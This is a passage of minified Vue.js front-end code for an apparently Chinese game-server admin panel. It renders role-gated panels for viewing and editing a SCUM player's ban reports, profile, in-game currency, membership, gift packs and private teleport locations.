t.stopPropagation(),e.clearAndReloadUserScumBanList.apply(null,arguments)}}},[e._v("刷新 ")]):e._e(),e.userInfo&&"sysAdmin"===e.userInfo.role?i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{icon:"upload",size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.$emit("click-create-report")}}},[e._v("跳转提交举报联办 ")]):e._e()]:e._e()],2),e.currentExpandKey&&void 0!==e.currentExpandKey.find((function(e){return"scum-ban"===e}))?i("div",{staticStyle:{width:"100%",height:"400px","overflow-y":"auto",position:"relative"}},[i("div",{staticStyle:{width:"100%",height:"100%",position:"absolute"}},[i("steam-info",{attrs:{"steam-info":e.currentUserScumBan.steamInfo}}),i("a-table",{staticStyle:{"margin-top":"10px"},attrs:{columns:e.currentUserScumBan.columns,"data-source":e.currentUserScumBan.userScumBanList,expandedRowKeys:e.currentUserScumBan.expandedScumBanIds,"row-key":"id",pagination:!1,loading:e.currentUserScumBan.loading,bordered:"",scroll:{x:"100%"},size:"small"},on:{expand:function(t,i){if(t)void 0===e.currentUserScumBan.expandedScumBanIds.find((function(e){return e===i.id}))&&e.currentUserScumBan.expandedScumBanIds.push(i.id);else{var a=Object.keys(e.currentUserScumBan.expandedScumBanIds).find((function(t){return e.currentUserScumBan.expandedScumBanIds[t]===i.id}));void 0!==a&&e.currentUserScumBan.expandedScumBanIds.splice(a,1)}}},scopedSlots:e._u([{key:"expandedRowRender",fn:function(t){return i("div",{staticStyle:{margin:"0",height:"500px","overflow-y":"auto"}},[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("提交证据说明")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("editor",{attrs:{disabled:!0},model:{value:t.reason,callback:function(i){e.$set(t,"reason",i)},expression:"record.reason"}}),i("div",{staticStyle:{width:"100%",height:"24px","margin-top":"10px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("可信度评价")]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("Liker",{attrs:{"scum-ban-id":t.id,"like-count":t.scumBanRemark?t.scumBanRemark.filter((function(e){return 0===e.remark})).length:0,"dislike-count":t.scumBanRemark?t.scumBanRemark.filter((function(e){return 1===e.remark})).length:0,"self-remark":t.selfRemark},on:{refresh:e.loadUserScumBanList}})],1)],1)}},{key:"createdTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}}],null,!1,1472414377)})],1),i("Loading",{attrs:{tip:"正在加载",show:e.currentUserInfo.loading}})],1):e._e()],2),i("a-collapse-panel",{key:"user"},[i("template",{slot:"header"},[i("span",{staticStyle:{"font-weight":"bolder"}},[e._v("用户资料")]),!1===e.currentUserInfo.loading&&e.currentExpandKey&&void 0!==e.currentExpandKey.find((function(e){return"user"===e}))?[!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role||!1!==e.currentUserInfo.edit?e._e():i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{icon:"edit",size:"small",disabled:e.readOnly},nativeOn:{click:function(t){return t.stopPropagation(),e.editUserInfo.apply(null,arguments)}}},[e._v("编辑 ")]),!0===e.currentUserInfo.edit?i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{icon:"save",loading:e.currentUserInfo.saveLoading,size:"small",type:"primary",disabled:e.readOnly},nativeOn:{click:function(t){return t.stopPropagation(),e.saveUserInfo.apply(null,arguments)}}},[e._v("保存 ")]):e._e(),!0===e.currentUserInfo.edit?i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{icon:"stop",size:"small",disabled:e.readOnly},nativeOn:{click:function(t){return t.stopPropagation(),e.cleanEditUserInfo.apply(null,arguments)}}},[e._v("取消 ")]):e._e()]:e._e()],2),e.currentExpandKey&&void 0!==e.currentExpandKey.find((function(e){return"user"===e}))?i("div",{staticStyle:{width:"100%","min-height":"320px",height:"auto",position:"relative"},style:{height:void 0!==e.currentUserInfo.editForm.configs&&null!==e.currentUserInfo.editForm.configs&&Object.keys(e.currentUserInfo.editForm.configs).length>0?350+47*Object.keys(e.currentUserInfo.editForm.configs).length+"px":"320px"}},[i("div",{staticStyle:{width:"100%",height:"100%",position:"absolute"}},[i("a-form-model",{ref:"userInfoForm",staticStyle:{"max-width":"600px"},attrs:{model:e.currentUserInfo.editForm,rules:e.userInfoRules,"label-col":{span:7},"wrapper-col":{span:14}}},[i("a-form-model-item",{attrs:{label:"用户昵称",prop:"userName"}},[i("a-input",{attrs:{disabled:!1===e.currentUserInfo.edit,placeholder:"小于等于50位长度"},model:{value:e.currentUserInfo.editForm.userName,callback:function(t){e.$set(e.currentUserInfo.editForm,"userName",t)},expression:"currentUserInfo.editForm.userName"}})],1),i("a-form-model-item",{attrs:{label:"Email",prop:"email"}},[i("a-input",{attrs:{disabled:!1===e.currentUserInfo.edit},model:{value:e.currentUserInfo.editForm.email,callback:function(t){e.$set(e.currentUserInfo.editForm,"email",t)},expression:"currentUserInfo.editForm.email"}})],1),i("a-form-model-item",{attrs:{label:"注册手机号码",prop:"phone"}},[i("a-input",{attrs:{disabled:!1===e.currentUserInfo.edit},model:{value:e.currentUserInfo.editForm.phone,callback:function(t){e.$set(e.currentUserInfo.editForm,"phone",t)},expression:"currentUserInfo.editForm.phone"}})],1),i("a-form-model-item",{attrs:{label:"Steam ID",prop:"steamId"}},[i("a-input",{attrs:{disabled:!1===e.currentUserInfo.edit,placeholder:"17位长度数字"},model:{value:e.currentUserInfo.editForm.steamId,callback:function(t){e.$set(e.currentUserInfo.editForm,"steamId",t)},expression:"currentUserInfo.editForm.steamId"}})],1),i("a-form-model-item",{attrs:{label:"账号状态",prop:"status"}},[i("a-select",{attrs:{disabled:!1===e.currentUserInfo.edit},model:{value:e.currentUserInfo.editForm.status,callback:function(t){e.$set(e.currentUserInfo.editForm,"status",t)},expression:"currentUserInfo.editForm.status"}},[i("a-select-option",{key:"normal",attrs:{title:"正常"}},[e._v("正常")]),i("a-select-option",{key:"frozen",attrs:{title:"冻结"}},[e._v("冻结")])],1)],1),i("a-form-model-item",{attrs:{label:"是否已经购买新手套餐",prop:"hasBoughtWelcomepack"}},[i("a-switch",{attrs:{disabled:!1===e.currentUserInfo.edit,"checked-children":"是","un-checked-children":"否"},model:{value:e.currentUserInfo.editForm.hasBoughtWelcomepack,callback:function(t){e.$set(e.currentUserInfo.editForm,"hasBoughtWelcomepack",t)},expression:"currentUserInfo.editForm.hasBoughtWelcomepack"}})],1),i("a-form-model-item",{attrs:{label:"购买新手滴滴车剩余次数",prop:"buyWelcomeDidiCarTime"}},[i("a-input-number",{attrs:{disabled:!1===e.currentUserInfo.edit,min:0},model:{value:e.currentUserInfo.editForm.buyWelcomeDidiCarTime,callback:function(t){e.$set(e.currentUserInfo.editForm,"buyWelcomeDidiCarTime",t)},expression:"currentUserInfo.editForm.buyWelcomeDidiCarTime"}})],1),i("a-form-model-item",{attrs:{label:"累计登录游戏时长"}},[e._v(" "+e._s(e.currentUserInfo.editForm.countLoginMinites)+"分钟 ")]),void 0!==e.currentUserInfo.editForm.configs&&null!==e.currentUserInfo.editForm.configs&&Object.keys(e.currentUserInfo.editForm.configs).length>0?[i("div",{staticStyle:{"line-heiht":"24px","font-weight":"bolder","padding-left":"10px","margin-top":"5px"}},[e._v("接入第三方平台用户标记")]),i("div",{staticStyle:{width:"calc(100% - 30px)",height:"2px",background:"black"}}),e._l(Object.keys(e.currentUserInfo.editForm.configs),(function(t){return i("div",{key:t,staticStyle:{"margin-top":"15px"}},[i("span",{staticStyle:{display:"inline-block",width:"130px","text-align":"right","padding-right":"10px"}},[e._v(e._s(t)+":")]),"number"===e.thirdPartyRobotUidConfigs.find((function(e){return e.key===t})).type?i("a-input-number",{staticStyle:{width:"calc(100% - 160px)"},attrs:{disabled:!1===e.currentUserInfo.edit},model:{value:e.currentUserInfo.editForm.configs[t],callback:function(i){e.$set(e.currentUserInfo.editForm.configs,t,i)},expression:"currentUserInfo.editForm.configs[key]"}}):i("a-input",{staticStyle:{width:"calc(100% - 160px)"},attrs:{disabled:!1===e.currentUserInfo.edit},model:{value:e.currentUserInfo.editForm.configs[t],callback:function(i){e.$set(e.currentUserInfo.editForm.configs,t,i)},expression:"currentUserInfo.editForm.configs[key]"}})],1)}))]:e._e()],2)],1),i("Loading",{attrs:{tip:"正在加载",show:e.currentUserInfo.loading}})],1):e._e()],2),i("a-collapse-panel",{key:"user-password"},[i("template",{slot:"header"},[i("span",{staticStyle:{"font-weight":"bolder"}},[e._v("用户密码")])]),e.currentExpandKey&&void 0!==e.currentExpandKey.find((function(e){return"user-password"===e}))?i("div",{staticStyle:{width:"100%",height:"24px",position:"relative"}},[i("div",{staticStyle:{width:"100%",height:"100%",position:"absolute"}},[!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role?i("span",[e._v("暂无可用操作")]):i("a-popconfirm",{attrs:{placement:"right",title:"确定要重置该用户的密码(重置后为'1234abcd')吗"},on:{confirm:e.clearUserPassword}},[i("a-button",{attrs:{size:"small",icon:"undo",type:"danger",loading:e.currentUserPassword.saveLoading,disabled:e.readOnly}},[e._v("重置密码 ")])],1)],1)]):e._e()],2),i("a-collapse-panel",{key:"user-dollar"},[i("template",{slot:"header"},[i("span",{staticStyle:{"font-weight":"bolder"}},[e._v("用户美金和会员信息")]),!1===e.currentUserDollar.loading&&e.currentExpandKey&&void 0!==e.currentExpandKey.find((function(e){return"user-dollar"===e}))?[!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role||!1!==e.currentUserDollar.edit?e._e():i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{icon:"edit",size:"small",disabled:e.readOnly},nativeOn:{click:function(t){return t.stopPropagation(),e.editUserDollar.apply(null,arguments)}}},[e._v("编辑 ")]),!0===e.currentUserDollar.edit?i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{icon:"save",loading:e.currentUserDollar.saveLoading,size:"small",type:"primary",disabled:e.readOnly},nativeOn:{click:function(t){return t.stopPropagation(),e.saveUserDollar.apply(null,arguments)}}},[e._v("保存 ")]):e._e(),!0===e.currentUserDollar.edit?i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{icon:"stop",size:"small",disabled:e.readOnly},nativeOn:{click:function(t){return t.stopPropagation(),e.cleanEditUserDollar.apply(null,arguments)}}},[e._v("取消 ")]):e._e()]:e._e()],2),e.currentExpandKey&&void 0!==e.currentExpandKey.find((function(e){return"user-dollar"===e}))?i("div",{staticStyle:{width:"100%",height:"270px",position:"relative"}},[i("div",{staticStyle:{width:"100%",height:"100%",position:"absolute"}},[i("a-form-model",{ref:"userDollarForm",staticStyle:{"max-width":"600px"},attrs:{model:e.currentUserDollar.editForm,rules:e.userDollarRules,"label-col":{span:7},"wrapper-col":{span:14}}},[i("a-form-model-item",{attrs:{label:"美金",prop:"dollars"}},[i("a-radio-group",{attrs:{size:"small",disabled:!1===e.currentUserDollar.edit,"button-style":"solid"},model:{value:e.currentUserDollar.editForm.type,callback:function(t){e.$set(e.currentUserDollar.editForm,"type",t)},expression:"currentUserDollar.editForm.type"}},[i("a-radio-button",{attrs:{value:"absolute"}},[e._v("原数值")]),i("a-radio-button",{attrs:{value:"relative"}},[e._v("相对变化")])],1),"absolute"===e.currentUserDollar.editForm.type?i("a-input-number",{staticStyle:{"margin-left":"10px"},attrs:{disabled:!1===e.currentUserDollar.edit,min:0},model:{value:e.currentUserDollar.editForm.dollars,callback:function(t){e.$set(e.currentUserDollar.editForm,"dollars",t)},expression:"currentUserDollar.editForm.dollars"}}):e._e(),"relative"===e.currentUserDollar.editForm.type?i("a-input-group",{staticStyle:{display:"inline-block",width:"200px","margin-left":"10px"},attrs:{compact:""}},[i("a-select",{attrs:{disabled:!1===e.currentUserDollar.edit},model:{value:e.currentUserDollar.editForm.relativeType,callback:function(t){e.$set(e.currentUserDollar.editForm,"relativeType",t)},expression:"currentUserDollar.editForm.relativeType"}},[i("a-select-option",{key:"plus"},[e._v("增加")]),i("a-select-option",{key:"minus"},[e._v("减少")])],1),"relative"===e.currentUserDollar.editForm.type?i("a-input-number",{attrs:{disabled:!1===e.currentUserDollar.edit,min:0},model:{value:e.currentUserDollar.editForm.relative,callback:function(t){e.$set(e.currentUserDollar.editForm,"relative",t)},expression:"currentUserDollar.editForm.relative"}}):e._e()],1):e._e()],1),i("a-form-model-item",{attrs:{label:"等级积分",prop:"chargeDollars"}},[i("a-input-number",{attrs:{disabled:!1===e.currentUserDollar.edit,min:0},model:{value:e.currentUserDollar.editForm.chargeDollars,callback:function(t){e.$set(e.currentUserDollar.editForm,"chargeDollars",t)},expression:"currentUserDollar.editForm.chargeDollars"}})],1),i("a-form-model-item",{attrs:{label:"会员等级",prop:"level"}},[i("a-select",{attrs:{disabled:!1===e.currentUserDollar.edit},on:{change:function(t,i){void 0!==t&&e.levelDetailList[e.levelDetailList.findIndex((function(t){return t.level===e.currentUserDollar.editForm.level}))].enableGesture||(e.currentUserDollar.editForm.gesture="")}},model:{value:e.currentUserDollar.editForm.level,callback:function(t){e.$set(e.currentUserDollar.editForm,"level",t)},expression:"currentUserDollar.editForm.level"}},e._l(e.levelList,(function(t){return i("a-select-option",{key:t,attrs:{title:t}},[e._v(e._s(t))])})),1)],1),i("a-form-model-item",{attrs:{label:"会员有效期",prop:"levelExpireTimeStamp"}},[i("a-date-picker",{staticStyle:{width:"350px"},attrs:{disabled:!1===e.currentUserDollar.edit,"show-time":{format:"YYYY-MM-DD HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:e.currentUserDollar.editForm.levelExpireTimeStamp,allowClear:""},on:{change:function(t){e.$set(e.currentUserDollar.editForm,"levelExpireTimeStamp",t)}}})],1),i("a-form-model-item",{attrs:{label:"会员称呼",prop:"gesture"}},[i("a-input",{attrs:{disabled:!1===e.currentUserDollar.edit||!e.levelDetailList[e.levelDetailList.findIndex((function(t){return t.level===e.currentUserDollar.editForm.level}))].enableGesture},model:{value:e.currentUserDollar.editForm.gesture,callback:function(t){e.$set(e.currentUserDollar.editForm,"gesture",t)},expression:"currentUserDollar.editForm.gesture"}})],1),i("a-form-model-item",{attrs:{label:"军衔等级",prop:"militaryLevelId"}},[i("a-select",{attrs:{disabled:!1===e.currentUserDollar.edit,allowClear:""},model:{value:e.currentUserDollar.editForm.militaryLevelId,callback:function(t){e.$set(e.currentUserDollar.editForm,"militaryLevelId",t)},expression:"currentUserDollar.editForm.militaryLevelId"}},e._l(e.militaryLevelList,(function(t){return i("a-select-option",{key:t.levelId,attrs:{title:t.level}},[e._v(e._s(t.level))])})),1)],1),i("a-form-model-item",{attrs:{label:"军衔有效期",prop:"militaryLevelExpireTimeStamp"}},[i("a-date-picker",{staticStyle:{width:"350px"},attrs:{disabled:!1===e.currentUserDollar.edit,"show-time":{format:"YYYY-MM-DD HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:e.currentUserDollar.editForm.militaryLevelExpireTimeStamp,allowClear:""},on:{change:function(t){e.$set(e.currentUserDollar.editForm,"militaryLevelExpireTimeStamp",t)}}})],1)],1)],1),i("Loading",{attrs:{tip:"正在加载",show:e.currentUserDollar.loading}})],1):e._e()],2),i("a-collapse-panel",{key:"user-new-gift"},[i("template",{slot:"header"},[i("span",{staticStyle:{"font-weight":"bolder"}},[e._v("用户新手签到N日礼包")]),e.currentExpandKey&&void 0!==e.currentExpandKey.find((function(e){return"user-new-gift"===e}))?[!1===e.currentUserNewGift.loading?i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{icon:"sync",size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.loadUserNewGift.apply(null,arguments)}}},[e._v("刷新 ")]):e._e()]:e._e()],2),e.currentExpandKey&&void 0!==e.currentExpandKey.find((function(e){return"user-new-gift"===e}))?i("div",{staticStyle:{width:"100%",height:"500px",position:"relative"}},[i("div",{staticStyle:{width:"100%",height:"32px","line-height":"32px"}},[i("span",[e._v("上次重置日期:")]),i("strong",{staticStyle:{color:"#18900f","margin-left":"5px"}},[e._v(e._s(void 0!==e.currentUserNewGift.fromTimeStamp?e.moment(e.currentUserNewGift.fromTimeStamp).format("YYYY-MM-DD HH:mm:ss"):"-"))]),i("a-popconfirm",{attrs:{placement:"right",title:"确定要重置该用户的礼包状态吗"},on:{confirm:e.resetUserNewGift}},[e.userInfo&&"sysAdmin"===e.userInfo.role?i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"redo"}},[e._v(" 重置礼包状态 ")]):e._e()],1)],1),i("div",{staticStyle:{width:"100%",height:"100%",position:"absolute","overflow-y":"auto"}},[i("a-table",{staticStyle:{"max-width":"950px"},attrs:{scroll:{y:410},columns:e.currentUserNewGift.columns,"data-source":e.currentUserNewGift.currentUserNewGiftList,"row-key":"id",pagination:!1,loading:e.currentUserNewGift.loading,bordered:"",size:"small"},scopedSlots:e._u([{key:"day",fn:function(t){return[i("span",[e._v(e._s(void 0!==t?"第"+t+"天":"-"))])]}},{key:"status",fn:function(t,a,n){return[!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role?[e.userNewGiftStatusBadgeKeyValue[t]?i("a-badge",{attrs:{status:e.userNewGiftStatusBadgeKeyValue[t]}}):e._e(),i("span",[e._v(e._s(t&&e.userNewGiftStatusList[t]?e.userNewGiftStatusList[t]:""))])]:i("a-dropdown",[i("span",{staticStyle:{cursor:"pointer"}},[e.userNewGiftStatusBadgeKeyValue[t]?i("a-badge",{attrs:{status:e.userNewGiftStatusBadgeKeyValue[t]}}):e._e(),i("span",[e._v(e._s(t&&e.userNewGiftStatusList[t]?e.userNewGiftStatusList[t]:""))]),i("a-icon",{staticStyle:{"margin-left":"3px",transform:"translateY(1px)","font-size":"13px"},attrs:{type:"down"}})],1),i("a-menu",{attrs:{slot:"overlay"},on:{click:function(t){e.updateUserNewGift(n,t.key)}},slot:"overlay"},e._l(e.userNewGiftStatusList,(function(t,a){return i("a-menu-item",{key:a},[e._v(e._s(t))])})),1)],1)]}},{key:"exclaimTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"buyId",fn:function(t){return[i("span",{staticStyle:{cursor:"pointer",color:"#1890ff"},on:{click:function(){return e.$router.push({path:"/buy",query:{id:t}})}}},[e._v(e._s("number"==typeof t?"点此查看":"-"))])]}}],null,!1,2868105069)})],1),i("Loading",{attrs:{tip:"正在加载",show:e.currentUserLogin.loading}})],1):e._e()],2),i("a-collapse-panel",{key:"user-achieve-gift"},[i("template",{slot:"header"},[i("span",{staticStyle:{"font-weight":"bolder"}},[e._v("用户成就礼包")]),e.currentExpandKey&&void 0!==e.currentExpandKey.find((function(e){return"user-achieve-gift"===e}))?[!1===e.currentUserAchieveGift.loading?i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{icon:"sync",size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.reloadUserAchieveGiftList.apply(null,arguments)}}},[e._v("刷新 ")]):e._e()]:e._e()],2),e.currentExpandKey&&void 0!==e.currentExpandKey.find((function(e){return"user-achieve-gift"===e}))?i("div",{staticStyle:{width:"100%",height:"500px",position:"relative"}},[i("div",{staticStyle:{width:"100%",height:"32px","line-height":"32px"}},[i("a-popconfirm",{attrs:{placement:"right",title:"确定要删除用户所有的成就礼包领取记录"},on:{confirm:e.cleanUserAchieveGiftByUser}},[e.userInfo&&"sysAdmin"===e.userInfo.role?i("a-button",{attrs:{type:"danger",size:"small",icon:"delete"}},[e._v(" 删除用户记录 ")]):e._e()],1)],1),i("div",{staticStyle:{width:"100%",height:"100%",position:"absolute","overflow-y":"auto"}},[i("a-table",{staticStyle:{"max-width":"950px"},attrs:{scroll:{y:410},columns:e.currentUserAchieveGift.columns,"data-source":e.currentUserAchieveGift.userAchieveGiftList,"row-key":"id",pagination:!1,loading:e.currentUserAchieveGift.loading,bordered:"",size:"small"},scopedSlots:e._u([{key:"createdTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"buyId",fn:function(t,a){return[i("span",{staticStyle:{cursor:"pointer",color:"#1890ff"},on:{click:function(){return e.$router.push({path:"/buy",query:{id:a.details&&a.details.queueId}})}}},[e._v(e._s(a.details&&a.details.queueId?"点此查看":"-"))])]}},{key:"controls",fn:function(t,a){return[!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role?e._e():[i("a-popconfirm",{attrs:{placement:"right",title:"确定要删除条目吗"},on:{confirm:function(){return e.deleteUserAchieveGift(a.id)}}},[i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{type:"danger",icon:"delete",size:"small",disabled:!(e.userInfo&&("sysAdmin"===e.userInfo.role||"admin"===e.userInfo.role))||0===a.level}},[e._v("删除")])],1)]]}}],null,!1,2774775515)})],1),i("Loading",{attrs:{tip:"正在加载",show:e.currentUserLogin.loading}})],1):e._e()],2),i("a-collapse-panel",{key:"user-locations"},[i("template",{slot:"header"},[i("span",{staticStyle:{"font-weight":"bolder"}},[e._v("用户私人传送位置")]),e.userInfo&&("sysAdmin"===e.userInfo.role||"admin"===e.userInfo.role)&&!1===e.currentUserLocations.loading&&e.currentExpandKey&&void 0!==e.currentExpandKey.find((function(e){return"user-locations"===e}))?[i("a-popover",{attrs:{placement:"right",visible:e.currentUserLocations.editor.show&&-1===e.currentUserLocations.editor.index,trigger:"click"}},[i("div",{staticStyle:{width:"350px"},attrs:{slot:"title"},slot:"title"},[i("span",{staticStyle:{"font-weight":"bolder"}},[e._v("新建坐标")]),i("span",{staticStyle:{cursor:"pointer"},on:{click:e.cleanUserLocationsEditor}},[i("a-icon",{staticStyle:{color:"#ff4d4f",float:"right",display:"inline-block",transform:"translateY(4px)"},attrs:{type:"close-circle",theme:"filled"}})],1)]),i("div",{staticStyle:{width:"350px"},attrs:{slot:"content"},slot:"content"},[i("div",{staticStyle:{width:"100%",height:"40px"}},[i("div",{staticStyle:{width:"90px","text-align":"right",display:"inline-block"}},[i("strong",{staticStyle:{color:"red","margin-right":"3px"}},[e._v("*")]),e._v("坐标: ")]),i("a-input",{staticStyle:{width:"250px",display:"inline-block","margin-left":"10px"},attrs:{placeholder:"坐标是以空格隔开的三个数字"},model:{value:e.currentUserLocations.editor.data.locations,callback:function(t){e.$set(e.currentUserLocations.editor.data,"locations",t)},expression:"currentUserLocations.editor.data.locations"}})],1),i("div",{staticStyle:{width:"100%",height:"40px","margin-top":"10px"}},[i("div",{staticStyle:{width:"90px","text-align":"right",display:"inline-block"}},[i("strong",{staticStyle:{color:"red","margin-right":"3px"}},[e._v("*")]),e._v("描述说明: ")]),i("a-input",{staticStyle:{width:"250px",display:"inline-block","margin-left":"10px"},model:{value:e.currentUserLocations.editor.data.description,callback:function(t){e.$set(e.currentUserLocations.editor.data,"description",t)},expression:"currentUserLocations.editor.data.description"}})],1),i("div",{staticStyle:{width:"100%",height:"40px","margin-top":"10px"}},[i("div",{staticStyle:{width:"90px","text-align":"right",display:"inline-block"}},[e._v("指定价格:")]),i("a-input-number",{staticStyle:{width:"175px",display:"inline-block","margin-left":"10px"},attrs:{min:0,placeholder:"置空则按照标准价格"},model:{value:e.currentUserLocations.editor.data.configs.price,callback:function(t){e.$set(e.currentUserLocations.editor.data.configs,"price",t)},expression:"currentUserLocations.editor.data.configs.price"}}),i("a-button",{staticStyle:{"margin-left":"10px"},on:{click:function(t){e.currentUserLocations.editor.data.configs.price=null}}},[e._v("置空 ")])],1),i("div",{staticStyle:{width:"100%",height:"40px","margin-top":"5px"}},[i("div",{staticStyle:{width:"90px","text-align":"right",display:"inline-block"}},[e._v("启用购买限制:")]),i("a-switch",{staticStyle:{"margin-left":"10px"},model:{value:e.currentUserLocations.editor.data.configs.purchaseLimitOn,callback:function(t){e.$set(e.currentUserLocations.editor.data.configs,"purchaseLimitOn",t)},expression:"currentUserLocations.editor.data.configs.purchaseLimitOn"}})],1),i("div",{staticStyle:{width:"100%",height:"40px","margin-top":"-5px"}},[i("div",{staticStyle:{width:"90px","text-align":"right",display:"inline-block"}},[e._v("限制次数:")]),i("a-input-number",{staticStyle:{width:"250px",display:"inline-block","margin-left":"10px"},attrs:{disabled:!e.currentUserLocations.editor.data.configs.purchaseLimitOn,min:0,placeholder:"置空则按照标准价格"},model:{value:e.currentUserLocations.editor.data.configs.time,callback:function(t){e.$set(e.currentUserLocations.editor.data.configs,"time",t)},expression:"currentUserLocations.editor.data.configs.time"}})],1),i("div",{staticStyle:{width:"100%",height:"40px","margin-top":"10px"}},[i("div",{staticStyle:{width:"90px","text-align":"right",display:"inline-block"}},[e._v("限制周期:")]),i("a-select",{staticStyle:{width:"250px",display:"inline-block","margin-left":"10px"},attrs:{allowClear:"",disabled:!e.currentUserLocations.editor.data.configs.purchaseLimitOn},model:{value:e.currentUserLocations.editor.data.configs.each,callback:function(t){e.$set(e.currentUserLocations.editor.data.configs,"each",t)},expression:"currentUserLocations.editor.data.configs.each"}},e._l(e.purchaseLimitEachKeyValue,(function(t,a){return i("a-select-option",{key:a,attrs:{title:t,disabled:!e.currentUserLocations.editor.data.configs.purchaseLimitOn}},[e._v(" "+e._s(t)+" ")])})),1)],1),i("div",{staticStyle:{width:"100%",height:"40px","margin-top":"10px","text-align":"center"}},[i("a-button",{attrs:{loading:e.currentUserLocations.editor.saveLoading,type:"primary"},on:{click:e.submitUserLocations}},[e._v("提交 ")])],1)]),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{icon:"plus",size:"small",disabled:!0===e.currentUserLocations.editor.show||e.readOnly},nativeOn:{click:function(t){return t.stopPropagation(),e.editNewUserLocations.apply(null,arguments)}}},[e._v("添加 ")])],1)]:e._e()],2),e.currentExpandKey&&void 0!==e.currentExpandKey.find((function(e){return"user-locations"===e}))?i("div",{staticStyle:{width:"100%",height:"410px",position:"relative"}},[i("div",{staticStyle:{width:"100%",height:"100%",position:"absolute","overflow-y":"auto"}},[i("a-table",{staticStyle:{"max-width":"840px"},attrs:{columns:e.currentUserLocations.columns,"data-source":e.currentUserLocations.userLocationsList,"row-key":"id",pagination:!1,loading:e.currentUserLocations.loading,bordered:"",size:"small"},scopedSlots:e._u([{key:"locations",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"description",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"price",fn:function(t,a){return[i("span",[e._v(e._s("number"==typeof a.configs.price?a.configs.price+"美金":"-"))])]}},{key:"purchaseLimit",fn:function(t,a){return[!0===a.configs.purchaseLimitOn?i("span",[e._v("每"+e._s(e.eachKeyValues[a.configs.each]||a.configs.each)+"限购"+e._s(a.configs.time)+"次")]):i("span",[e._v("无")])]}},{key:"controls",fn:function(t,a,n){return[i("a-popover",{attrs:{placement:"right",visible:e.currentUserLocations.editor.show&&e.currentUserLocations.editor.index===n,trigger:"click"}},[i("div",{staticStyle:{width:"350px"},attrs:{slot:"title"},slot:"title"},[i("span",{staticStyle:{"font-weight":"bolder"}},[e._v("编辑坐标")]),i("span",{staticStyle:{cursor:"pointer"},on:{click:e.cleanUserLocationsEditor}},[i("a-icon",{staticStyle:{color:"#ff4d4f",float:"right",display:"inline-block",transform:"translateY(4px)"},attrs:{type:"close-circle",theme:"filled"}})],1)]),i("div",{staticStyle:{width:"350px"},attrs:{slot:"content"},slot:"content"},[i("div",{staticStyle:{width:"100%",height:"40px"}},[i("div",{staticStyle:{width:"90px","text-align":"right",display:"inline-block"}},[i("strong",{staticStyle:{color:"red","margin-right":"3px"}},[e._v("*")]),e._v("坐标: ")]),i("a-input",{staticStyle:{width:"250px",display:"inline-block","margin-left":"10px"},attrs:{placeholder:"坐标是以空格隔开的三个数字"},model:{value:e.currentUserLocations.editor.data.locations,callback:function(t){e.$set(e.currentUserLocations.editor.data,"locations",t)},expression:"currentUserLocations.editor.data.locations"}})],1),i("div",{staticStyle:{width:"100%",height:"40px","margin-top":"10px"}},[i("div",{staticStyle:{width:"90px","text-align":"right",display:"inline-block"}},[i("strong",{staticStyle:{color:"red","margin-right":"3px"}},[e._v("*")]),e._v("描述说明: ")]),i("a-input",{staticStyle:{width:"250px",display:"inline-block","margin-left":"10px"},model:{value:e.currentUserLocations.editor.data.description,callback:function(t){e.$set(e.currentUserLocations.editor.data,"description",t)},expression:"currentUserLocations.editor.data.description"}})],1),i("div",{staticStyle:{width:"100%",height:"40px","margin-top":"10px"}},[i("div",{staticStyle:{width:"90px","text-align":"right",display:"inline-block"}},[e._v("指定价格:")]),i("a-input-number",{staticStyle:{width:"175px",display:"inline-block","margin-left":"10px"},attrs:{min:0,placeholder:"置空则按照标准价格"},model:{value:e.currentUserLocations.editor.data.configs.price,callback:function(t){e.$set(e.currentUserLocations.editor.data.configs,"price",t)},expression:"currentUserLocations.editor.data.configs.price"}}),i("a-button",{staticStyle:{"margin-left":"10px"},on:{click:function(t){e.currentUserLocations.editor.data.configs.price=null}}},[e._v(" 置空 